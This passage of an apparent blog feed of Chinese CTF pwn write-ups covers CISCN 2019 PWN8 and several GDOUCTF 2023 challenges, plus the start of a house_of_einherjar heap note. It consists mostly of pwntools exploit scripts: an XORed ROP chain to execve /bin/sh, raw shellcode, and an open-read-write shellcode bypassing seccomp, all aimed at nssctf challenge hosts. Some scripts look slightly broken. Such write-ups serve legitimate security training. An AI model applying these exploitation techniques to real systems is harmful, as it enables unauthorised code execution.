2019华南]PWN8\n┌──(str1d3r㉿str1k3Gwindows)-[~/Desktop/nssctf/[CISCN 2019华南]PWN8]└─$ python exp.py[+] Starting local process &#x27;./pwn&#x27;: pid 221[DEBUG] &#x27;/[CISCN 2019华南]PWN8/pwn&#x27; is statically linked, skipping GOT/PLT symbols[*] &#x27;/[CISCN 2019华南]PWN8/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nROPgadget --binary pwn --ropchain\n面对静态链接的题，ROPgadget可以自动生成rop链\n#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x000000000044c156) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscall\n再来看看这道题还有什么别的：main\n__int64 sub_4005A0()&#123;  char v1[520]; // [rsp+0h] [rbp-208h] BYREF  sub_400BF0();  sub_410550(&quot;Please enter your Password: &quot;);  sub_449BE0(0, v1, 0x200uLL);  if ( (unsigned int)sub_400C40(v1) )    sub_410550(&quot;Correct!&quot;);  else    sub_410550(&quot;Wrong!&quot;);  return 0LL;&#125;\nprintf\n__int64 __fastcall sub_410550(__int64 a1)&#123;  __int64 v2; // rax  _QWORD *v3; // rbp  __int64 v4; // rbx  _DWORD *v5; // rdi  int v6; // eax  unsigned __int64 v8; // r8  bool v10; // zf  int v11; // eax  __int64 v12; // r13  _BYTE *v13; // rax  unsigned __int64 v14; // rbx  __int64 v15; // rdx  v2 = sub_4004C0();  v3 = off_6BA7A0;  v4 = v2;  v5 = off_6BA7A0;  if ( (*(_DWORD *)off_6BA7A0 &amp; 0x8000) == 0 )  &#123;    _RDX = *((_QWORD *)off_6BA7A0 + 17);    v8 = __readfsqword(0x10u);    if ( *(_QWORD *)(_RDX + 8) == v8 )    &#123;LABEL_9:      ++*(_DWORD *)(_RDX + 4);      goto LABEL_10;    &#125;    _ESI = 1;    v10 = dword_6BD80C == 0;    if ( dword_6BD80C )    &#123;      v6 = *(_DWORD *)off_6BA7A0 &amp; 0x8000;      if ( v6 == _InterlockedCompareExchange((volatile signed __int32 *)_RDX, 1, v6) )        goto LABEL_8;    &#125;    else    &#123;      __asm &#123; cmpxchg [rdx], esi &#125;      if ( v10 )      &#123;LABEL_8:        _RDX = v3[17];        v5 = off_6BA7A0;        *(_QWORD *)(_RDX + 8) = v8;        goto LABEL_9;      &#125;    &#125;    sub_44C130(_RDX, 1LL);    goto LABEL_8;  &#125;LABEL_10:  v11 = v5[48];  if ( v11 )  &#123;    if ( v11 != -1 )      goto LABEL_28;  &#125;  else  &#123;    v5[48] = -1;  &#125;  v12 = *((_QWORD *)v5 + 27);  if ( (char *)&amp;off_6BC2C8 - (char *)&amp;unk_6BBC20 &lt;= (unsigned __int64)(v12 - (_QWORD)&amp;unk_6BBC20) )  &#123;    sub_412C50();    v5 = off_6BA7A0;  &#125;  if ( v4 != (*(__int64 (__fastcall **)(_DWORD *, __int64, __int64))(v12 + 56))(v5, a1, v4) )    goto LABEL_28;  v13 = (_BYTE *)*((_QWORD *)off_6BA7A0 + 5);  if ( (unsigned __int64)v13 &lt; *((_QWORD *)off_6BA7A0 + 6) )  &#123;    *((_QWORD *)off_6BA7A0 + 5) = v13 + 1;    *v13 = 10;    goto LABEL_17;  &#125;  if ( (unsigned int)sub_416970(off_6BA7A0, 10LL) == -1 )  &#123;LABEL_28:    LODWORD(v14) = -1;    goto LABEL_19;  &#125;LABEL_17:  v14 = v4 + 1;  if ( v14 &gt; 0x7FFFFFFF )    LODWORD(v14) = 0x7FFFFFFF;LABEL_19:  if ( (*(_DWORD *)v3 &amp; 0x8000) == 0 )  &#123;    v15 = v3[17];    v10 = (*(_DWORD *)(v15 + 4))-- == 1;    if ( v10 )    &#123;      *(_QWORD *)(v15 + 8) = 0LL;      if ( dword_6BD80C )      &#123;        if ( !_InterlockedDecrement((volatile signed __int32 *)v15) )          return (unsigned int)v14;        goto LABEL_25;      &#125;      v10 = (*(_DWORD *)v15)-- == 1;      if ( !v10 )LABEL_25:        sub_44C160(v15);    &#125;  &#125;  return (unsigned int)v14;&#125;\nread\nunsigned __int64 __fastcall sub_449BE0(unsigned int fd, char *buf, size_t count)&#123;  unsigned __int64 result; // rax  unsigned __int64 v5; // rax  unsigned int v6; // r8d  unsigned __int64 v7; // [rsp+0h] [rbp-20h]  if ( dword_6BD80C )  &#123;    sub_44C180();    v5 = sys_read(fd, buf, count);    if ( v5 &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      __writefsdword(0xFFFFFFC0, -(int)v5);      v5 = -1LL;    &#125;    v7 = v5;    sub_44C1E0(v6);    return v7;  &#125;  else  &#123;    result = sys_read(fd, buf, count);    if ( result &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      __writefsdword(0xFFFFFFC0, -(int)result);      return -1LL;    &#125;  &#125;  return result;&#125;\n这个函数会把传入的参数进行异或，所以我们要先把先前生成的rop链异或再传入,顺便缩短一下ropchain\n_BOOL8 __fastcall sub_400C40(const char *a1)&#123;  char *v1; // rbp  int v2; // edx  unsigned int v3; // eax  __int64 v4; // rbp  __int64 v5; // r12  char *v6; // rax  char *v7; // rdx  _BOOL8 result; // rax  char v9; // [rsp+8h] [rbp-50h] BYREF  _BYTE v10[7]; // [rsp+9h] [rbp-4Fh] BYREF  char v11[72]; // [rsp+10h] [rbp-48h] BYREF  v1 = strcpy(&amp;v9, a1);  do  &#123;    v2 = *(_DWORD *)v1;    v1 += 4;    v3 = ~v2 &amp; (v2 - 16843009) &amp; 0x80808080;  &#125;  while ( !v3 );  if ( (~v2 &amp; (v2 - 16843009) &amp; 0x8080) == 0 )    v3 &gt;&gt;= 16;  if ( (~v2 &amp; (v2 - 16843009) &amp; 0x8080) == 0 )    v1 += 2;  v4 = &amp;v1[-__CFADD__((_BYTE)v3, (_BYTE)v3) - 3] - &amp;v9;  v5 = sub_4102B0(&quot;pass_enc.txt&quot;, &amp;unk_4A593F);  if ( (__int16)v4 &gt; 0 )  &#123;    v6 = v10;    v7 = &amp;v9;    while ( 1 )    &#123;      *v7 ^= 0x66u; //这里有个异或      v7 = v6;      if ( v6 == &amp;v10[(__int16)v4 - 1] )        break;      ++v6;    &#125;  &#125;  result = 0LL;  if ( v5 )  &#123;    sub_4103D0(v11, 40LL, 1LL, v5);    sub_40FD50(v5);    return (unsigned int)sub_400498(v11, &amp;v9) == 0;  &#125;  return result;&#125;\nexp:\nfrom ctypes import *from pwn import *#io = process(&#x27;./pwn&#x27;)io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28324)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)elf = ELF(&#x27;./pwn&#x27;)from struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += p64(59)p += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscallep = b&#x27;&#x27;for i in range(len(p)):        ep += p8(ord(p[i:i+1]) ^ 0x66)    payload = b&#x27;a&#x27;*0x50 + epio.sendafter(b&#x27;Password: \\n&#x27;, payload)io.interactive()","categories":["stack"],"tags":["shellcode"]},{"title":"GDOUCTF2023_pwn","url":"/2023/07/20/GDOUCTF2023-pwn/","content":"温故而知新[GDOUCTF 2023]真男人下120层\nv9 = __readfsqword(0x28u);  setbuf(_bss_start, 0LL);  v3 = time(0LL);  srand(v3);  v8 = 2772839826LL;  v4 = rand();  srand(v4 % 3 - 1522127470);...... if ( rand() % 4 + 1 != v6 )    &#123;      printf(&quot;\\x1B[31m&quot;);      puts(&quot;YOU DIED!&quot;);      printf(&quot;\\x1B[0m&quot;);      return 0;    &#125;    system(&quot;clear&quot;);  puts(&quot;Congratulation!&quot;);  cat_flag();  \n已知种子随机数种子有三种情况：0 - 15221274701 - 15221274702 - 1522127470\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;        int b;        //srand(0 - 1522127470);        srand(1 - 1522127470);        //srand(2 - 1522127470);//三选一，不行多跑几次        for (int i = 1; i &lt;=120; i++)&#123;                b = rand() % 4 + 1;                printf(&quot;\\&#x27;%d\\&#x27;,&quot;, b);        &#125;        return 0;&#125;\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)io = remote(&#x27;node5.anna.nssctf.cn&#x27;,28310)s = [&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,&#x27;3&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;4&#x27;,&#x27;1&#x27;,&#x27;3&#x27;,]for i in range(120):  io.recv()   io.sendline(str(s[i]))  io.recv()io.recv()io.recv()\n靶机随机数生成可能不一样，多试几次[GDOUCTF 2023]小学数学\nimport randomimport signaldef ran():    return random.randint(999,99999)def add():    question = f&quot;&#123;ran()&#125; + &#123;ran()&#125; = &quot;    print(question.replace(&#x27;+&#x27;,&#x27;-&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def sub():    question = f&quot;&#123;ran()&#125; - &#123;ran()&#125; = &quot;    print(question.replace(&#x27;-&#x27;,&#x27;x&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def mul():    question = f&quot;&#123;ran()&#125; x &#123;ran()&#125; = &quot;    print(question.replace(&#x27;x&#x27;,&#x27;//&#x27;))    answer = eval(question[:-2].replace(&#x27;x&#x27;,&#x27;*&#x27;))        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def div():    question = f&quot;&#123;ran()&#125; // &#123;ran()&#125; = &quot;    print(question.replace(&#x27;//&#x27;,&#x27;%&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)def mod():    question = f&quot;&#123;ran()&#125; % &#123;ran()&#125; = &quot;    print(question.replace(&#x27;%&#x27;,&#x27;+&#x27;))    answer = eval(question[:-2])        calc = input()    if calc == str(answer):        print(&quot;Correct.&quot;)    else:        print(&quot;Wrong.&quot;)        exit(0)print(&quot;  ____ ____   ___  _   _    ____ _____ _____ &quot;)print(&quot; / ___|  _ \\ / _ \\| | | |  / ___|_   _|  ___|&quot;)print(&quot;| |  _| | | | | | | | | | | |     | | | |_   &quot;)print(&quot;| |_| | |_| | |_| | |_| | | |___  | | |  _|  &quot;)print(&quot; \\____|____/ \\___/ \\___/   \\____| |_| |_|    &quot;)print(&quot;\t\t\t\t\t\t\t\t\t\t\t\t&quot;)print(&quot;Welcome to the calculate challenge. Please try to solve 300 Question in 600 seconds.&quot;)print(&quot;ATTENTION: This is an April Fool&#x27;s game, and the real problem may not be what it seems&quot;)print(&quot;&quot;)input(&quot;Press Enter to start...&quot;)signal.alarm(600)for i in range(300):    print(&quot;Round: &quot;+str(i+1))    random.choice([add,sub,mul,div,mod])()flag = open(&#x27;/flag&#x27;).read()print(&quot;Congratulations on passing the challenge. This is your flag: &quot; + str(flag))\n\nfrom pwn import *context.log_level = &#x27;debug&#x27;p = remote(&#x27;node2.anna.nssctf.cn&#x27;,29000)io.sendline(b&#x27;&#x27;)print(&#x27;plz wait..&#x27;)for i in range(300):    io.recvuntil(str(i+1).encode())    num1 = int(io.recvuntil(b&#x27; &#x27;))    op = io.recvuntil(b&#x27; &#x27;)    num2 = int(io.recvuntil(b&#x27; &#x27;))    print(num1, op[0], num2)    if(op[0] == ord(&#x27;-&#x27;)):        io.sendline(str(num1+num2).encode())    elif(op[0] == ord(&#x27;x&#x27;)):        io.sendline(str(num1-num2).encode())    elif(op[0] == ord(&#x27;/&#x27;)):        io.sendline(str(num1*num2).encode())    elif(op[0] == ord(&#x27;%&#x27;)):        io.sendline(str(num1//num2).encode())    else:        io.sendline(str(num1%num2).encode())io.interactive()\n\n\n[GDOUCTF 2023]奇怪的ELFLinux1直接运行就行Linux2是arm架构下编译的，走逆向\n.data:0000000000003A60                               ; char flag[17].data:0000000000003A60 F2 EE E3 D9 CA EF E8 F3 FE D9+flag DCB 0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9, 0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB\nflag =[0xCE, 0xDC, 0xC5, 0xD2, 0xC0, 0xFD, 0xF1, 0xE3, 0xEA, 0xE5, 0xE9, 0xEB, 0xE3, 0xD9, 0xF2, 0xE9, 0xD9,  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,   0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB] #flag1+flag2for i in flag:    print(chr(i^0x86),end=&#x27;&#x27;)\nHZCTF{welcome_to_the_Linux_world!}[GDOUCTF 2023]EASY PWN\nint check()&#123;  int result; // eax  char buf[10]; // [rsp+7h] [rbp-29h] BYREF  char s1[15]; // [rsp+11h] [rbp-1Fh] BYREF  ssize_t v3; // [rsp+20h] [rbp-10h]  int fd; // [rsp+28h] [rbp-8h]  int v5; // [rsp+2Ch] [rbp-4h]  v5 = 0;  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &lt; 0 )  &#123;    puts(&quot;Can&#x27;t access /dev/urandom.&quot;);    exit(1);  &#125;  v3 = read(fd, buf, 0xAuLL);  if ( v3 &lt; 0 )  &#123;    puts(&quot;Data not received from /dev/urandom&quot;);    exit(1);  &#125;  close(fd);  puts(&quot;Password:&quot;);  gets(s1);  result = strcmp(s1, buf);  if ( result )    result = puts(&quot;I swore that was the right password ...&quot;);  else    v5 = 1;  if ( v5 )  &#123;    puts(&quot;Guess I couldn&#x27;t gaslight you!&quot;);    return print_flag();  &#125;  return result;&#125;\n把v5覆盖成不为0的值即可[GDOUCTF 2023]Shellcode\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  setbuf(stdout, 0LL);  mprotect((void *)((unsigned __int64)&amp;stdout &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);  puts(&quot;Please.&quot;);  read(0, &amp;name, 0x25uLL);  puts(&quot;Nice to meet you.&quot;);  puts(&quot;Let&#x27;s start!&quot;);  read(0, buf, 0x40uLL);  return 0;&#125;\n可以看到第一个read可以把输入的东西直接写入.bss段，第二个read存在明显的栈溢出，所以思路很明确，第一次输入将shellcode写在.bss段上，再用第二次输入溢出后跳到.bss段执行shellcode。唯一坑：shellcode有长度限制\nfrom pwn import *import sgtlibcelf=ELF(&#x27;./shellcode&#x27;)pop_rdi_addr = 0x4007b3ret_addr = 0x4007ADmain_addr = 0x400687puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]bss_addr = 0x6010a0context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node2.anna.nssctf.cn&#x27;,28500)#wrongpayload1 = asm(shellcraft())payload1=&quot;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x31\\xF6\\x31\\xD2\\x6A\\x3B\\x58\\x0F\\x05&quot;p.sendlineafter(&quot;Please.\\n&quot;,payload1)payload2 =  b&#x27;a&#x27;*(0xa+8)+p64(bss_addr) p.sendlineafter(&#x27;start!\\n&#x27;,payload2)p.interactive()\n贴两个传送门：https://www.roderickchan.cn/zh-cn/2023-02-20-the-art-of-shellcode &#x2F;&#x2F;art of the shellcode            https://defuse.ca/online-x86-assembler.htm#disassembly  &#x2F;&#x2F;编译shellcode的网站\n[GDOUCTF 2023]Random开了沙盒\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump &#x27;/var/run/vmblock-fuse/blockdir/QC26KN/RANDOM&#x27;  line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n0x60100到0x60200这段内存可读可写可执行，所以尝试把shellcode写入这段后将执行流劫持到该段haha函数内存在jmp rsp指令\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;# 连接远程p = remote(&quot;node6.anna.nssctf.cn&quot;,28969)# 加载rand函数的所在函数库libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))#设置srand函数jmp_sp = 0x40094Edata_addr = 0x601000#通过随机数验证  程序会跳转到vulnerable函数p.sendlineafter(&quot;num:&quot;,str(libc.rand()%50))&quot;&quot;&quot;利用 jmp_sp + asm 的攻击方式  让sp指针跳回变量地址 执行shellcode:     在data_addr 0x601000 写入orw_shellcode后    并跳转执行data_addr 0x12300的orw_shellcode&quot;&quot;&quot;payload=asm(shellcraft.read(0,data_addr,0x100))#调用read函数 在data_addr 0x601000处写入 orw_shellcode内容payload+=asm(&#x27;mov rax,0x601000;call rax&#x27;)#并且call ax寄存器 调用执行 data_addr 0x601000处的orw_shellcodepayload=payload.ljust(0x28,b&#x27;\\x00&#x27;)#打满变量空间 和 rbp寄存器的字节payload+=p64(jmp_sp)#返回地址写成jmp_esp，继续运行当前sp后续指令 填写别的返回地址 就无法控制程序后面的执行流程了payload+=asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)#此时sp已经离shellcode地址偏移0x30,这里把sp挪回到shellcode地址 并跳转到shellcodep.sendlineafter(&quot;your door\\n&quot;,payload)&quot;&quot;&quot;orw_shellcode执行的内容:打开本地的flag文件 把flag文件内容写入到 data_addr+0x100把输出data_addr+0x100的flag文件内容&quot;&quot;&quot;orw_shellcode = shellcraft.open(&quot;./flag&quot;)#打开本地的flag文件orw_shellcode += shellcraft.read(3, data_addr+0x100, 0x50)#文件描述符3:其它打开的文件 flag内容写入到data_addr+0x100orw_shellcode += shellcraft.write(1, data_addr+0x100,0x50)#文件描述符1:输出  地址data_addr+0x100存储的flag内容p.send(asm(orw_shellcode))p.interactive()","categories":["wp"],"tags":["random"]},{"title":"house_of_einherjar","url":"/2023/10/10/house-of-einherjar/","content":"来玩把祖玛吧利用的是free的后向合并\nfree函数后向合并关键代码\n/*consolidate backward*/if (!prev_inuse(p))&#123;//判断被释放堆块p的inuse标志位是否为0，如果为0则进行if中的内容，相当于一个检查。通过这个点说明我们至少要通过堆溢出去覆盖掉相邻高地址位的inuse标志位，最常见的方式就是off-by-one    prevsize p-&gt;prev size;//记录相邻堆块p的prev_size值    size += prev_size;//size为size + prev_size    p = 